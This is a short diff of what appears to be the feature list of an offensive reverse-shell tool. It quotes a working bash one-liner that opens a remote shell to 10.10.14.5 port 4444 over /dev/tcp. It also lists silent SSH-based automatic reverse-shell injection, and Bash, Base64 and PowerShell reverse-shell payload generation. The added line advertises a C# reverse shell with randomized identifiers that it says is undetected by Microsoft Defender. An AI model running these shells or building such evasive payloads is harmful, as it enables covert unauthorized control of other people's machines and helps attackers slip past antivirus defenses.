@@ -105,10 +105,11 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Silent execution (only shows SSH password prompt)
   - Format: `ssh user@host` or `ssh user@host:port`
   - Automatic reverse shell payload injection
-- [x] **Payload Generation** (`internal/payloads.go`) 🆕
+- [x] **Payload Generation** (`internal/payloads.go`, `internal/csharp_shell.go`) 🆕
   - Bash reverse shells
   - Bash Base64-encoded payloads
   - PowerShell reverse shells (UTF-16LE encoded)
+  - **C# custom reverse shell** — compiled .NET Framework 4.7.2 exe with randomized identifiers, no shellcode/PInvoke (undetected by Defender). Use `rev csharp [output.exe]`
   - Automatic payload generation based on listener IP/port
 - [x] **Network Utilities** (`internal/netutil.go`) 🆕
   - Interface IP resolution (`-i eth0` → resolves to IP)
